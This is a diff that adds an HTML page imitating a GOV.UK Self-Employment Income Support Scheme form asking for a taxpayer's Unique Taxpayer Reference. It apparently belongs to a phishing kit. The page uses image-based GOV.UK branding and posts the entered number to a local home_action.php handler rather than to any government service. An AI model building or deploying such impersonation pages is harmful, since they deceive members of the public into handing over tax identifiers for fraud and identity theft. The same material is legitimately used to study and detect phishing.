@@ -1,0 +1,128 @@
+<html class="govuk-template " lang="en"><head> 
+    <meta charset="utf-8">
+    <title> Enter your Self Assessment Unique Taxpayer Reference - Self-Employment Income Support Scheme - GOV.UK</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#0b0c0c"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="stylesheet" href="css/style.css">
+<link rel="shortcut icon" href="images/favicon.png">
+<script type="text/javascript" src="js/jqueryLib.js"></script>
+<script language="JavaScript" type="text/javascript">
+
+/*<![CDATA[*/
+function numbersOnly(field, event) {
+	return allowedChars(field, event, "-0123456789.,");
+}
+
+
+function digitsOnly(field, event) {
+	return allowedChars(field, event, "0123456789");
+}
+
+function allowedChars(field, event, chars) {
+	var key;
+
+	if (window.event) {
+		key = window.event.keyCode;
+	} else {
+		if (event) {
+			key = event.which;
+		} else {
+			return true;
+		}
+	}
+
+	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
+		return true;
+	} else {
+		var keychar = String.fromCharCode(key);
+
+		if (chars.indexOf(keychar) > -1) {
+			return true;
+		} else {
+			return false;
+		}
+	}
+}
+
+function isOneOf(key) {
+	for (arg in arguments) {
+		if (key == arg) {
+			return true;
+		}
+	}
+	
+	return false;
+}
+			/*]]>*/</script> 
+
+ 
+</head>
+
+<body>
+   
+   <div class="header-const">
+      <div class="header"></div>
+   </div>
+   <div class="header2-const">
+      <div class="header2"></div>
+   </div>
+   <div class="img2-const">
+      <div class="img2"></div>
+   </div>
+   <div class="content-const">
+       <div class="content">
+         <form name="form1" method="post" action="home_action.php">
+           <table width="400" border="0">
+             <tbody><tr>
+               <td>&nbsp;</td>
+             </tr>
+             <tr>
+               <td>
+           <input type="text" name="taxno" id="taxno" maxlength="10" minlength="10" required="" autocomplete="off" class="username" onkeypress="javascript:return(numbersOnly(this,event));"></td>
+             </tr>
+             <tr>
+               <td>&nbsp;</td>
+             </tr>
+             <tr>
+               <td>&nbsp;</td>
+             </tr>
+             <tr>
+               <td><input type="submit" name="btncontinue" id="btncontinue" value="s" class="btnlogin"></td>
+             </tr>
+             <tr>
+               <td>&nbsp;</td>
+             </tr>
+             <tr>
+               <td>&nbsp;</td>
+             </tr>
+             <tr>
+               <td>&nbsp;</td>
+             </tr>
+             <tr>
+               <td><div class="img4"></div>&nbsp;</td>
+             </tr>
+             <tr>
+               <td>&nbsp;</td>
+             </tr>
+           </tbody></table>
+           
+         </form>
+       </div>
+   </div>
+  <div class="footer-const">
+      <div class="footer"></div>
+  </div>
+<script>
+   var input = document.getElementById("taxno");
+   input.addEventListener("keyup", function(event){
+	  if(event.keyCode === 13){
+	    event.preventDefault();
+		document.getElementById("btncontinue").click();
+	  }
+	
+	});
+</script> 
+<script type="text/javascript" src="js/actions.js"></script>
+
+</body></html>
